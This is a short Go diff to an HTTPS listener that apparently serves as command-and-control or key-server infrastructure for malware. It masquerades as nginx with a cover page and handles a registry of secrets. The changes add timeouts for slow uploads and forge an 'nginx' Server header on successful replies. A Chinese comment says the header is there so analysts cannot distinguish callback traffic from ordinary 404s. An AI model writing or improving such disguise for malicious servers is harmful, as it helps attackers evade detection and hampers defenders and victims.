@@ -78,6 +78,8 @@ func Start(cfg ListenerConfig, store *Store, secrets *SecretRegistry) (*Listener
 	l.server = &http.Server{
 		Handler:           http.HandlerFunc(l.handler),
 		ReadHeaderTimeout: 15 * time.Second,
+		ReadTimeout:       2 * time.Minute, // 覆盖慢速上传的请求体读取
+		IdleTimeout:       2 * time.Minute,
 		TLSConfig:         &tls.Config{Certificates: []tls.Certificate{cert}},
 	}
 	ln, err := net.Listen("tcp", net.JoinHostPort(cfg.Host, fmt.Sprint(cfg.Port)))
@@ -97,7 +99,7 @@ func (l *Listener) Stop() error {
 
 func (l *Listener) notFound(w http.ResponseWriter) {
 	w.Header().Set("Server", "nginx")
-	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.Header().Set("Content-Type", "text/html")
 	w.WriteHeader(http.StatusNotFound)
 	_, _ = w.Write([]byte(nginxCoverPage))
 }
@@ -153,6 +155,7 @@ func (l *Listener) handler(w http.ResponseWriter, r *http.Request) {
 		l.notFound(w)
 		return
 	}
+	w.Header().Set("Server", "nginx") // 200 与 404 走同一应答头外观，避免被解密者区分回连
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusOK)
 	_, _ = w.Write(respBody)
